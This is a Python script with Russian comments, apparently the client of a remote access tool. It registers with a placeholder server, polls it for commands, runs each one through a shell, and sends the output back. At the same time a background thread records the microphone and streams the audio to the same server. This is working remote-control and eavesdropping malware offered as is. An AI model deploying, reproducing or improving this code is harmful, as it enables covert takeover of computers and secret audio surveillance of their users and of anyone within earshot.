import os
import sys
import time
import requests
import subprocess
import threading
import pyaudio

# Настройки клиента
SERVER_URL = "http://<SERVER_IP>:5000"
CLIENT_ID = "client_1"

# Настройки аудио
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

# Регистрация клиента на сервере
def register_client():
    try:
        response = requests.post(f"{SERVER_URL}/register", data={'client_id': CLIENT_ID})
        if response.status_code == 200:
            print("[+] Клиент зарегистрирован на сервере.")
        else:
            print("[-] Ошибка регистрации клиента.")
    except Exception as e:
        print(f"[-] Ошибка подключения к серверу: {e}")

# Получение команды от сервера
def get_command():
    try:
        response = requests.post(f"{SERVER_URL}/command", data={'client_id': CLIENT_ID})
        if response.status_code == 200:
            return response.text
    except Exception as e:
        print(f"[-] Ошибка получения команды: {e}")
    return None

# Отправка результата выполнения команды
def send_result(result):
    try:
        requests.post(f"{SERVER_URL}/result", data={'client_id': CLIENT_ID, 'result': result})
        print("[+] Результат отправлен на сервер.")
    except Exception as e:
        print(f"[-] Ошибка отправки результата: {e}")

# Поток для передачи аудио
def stream_audio():
    audio = pyaudio.PyAudio()
    stream = audio.open(format=FORMAT, channels=CHANNELS,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)
    print("[+] Аудио поток начат.")
    try:
        while True:
            data = stream.read(CHUNK)
            try:
                requests.post(f"{SERVER_URL}/audio", data=data)
            except Exception as e:
                print(f"[-] Ошибка отправки аудио: {e}")
    except KeyboardInterrupt:
        print("[+] Остановка аудио потока.")
    finally:
        stream.stop_stream()
        stream.close()
        audio.terminate()

# Основной цикл
def main_loop():
    while True:
        command = get_command()
        if command:
            print(f"[+] Получена команда: {command}")
            try:
                result = subprocess.check_output(command, shell=True, text=True)
                send_result(result)
            except Exception as e:
                send_result(f"Ошибка выполнения: {e}")
        time.sleep(5)

if __name__ == "__main__":
    register_client()
    threading.Thread(target=stream_audio, daemon=True).start()
    main_loop()
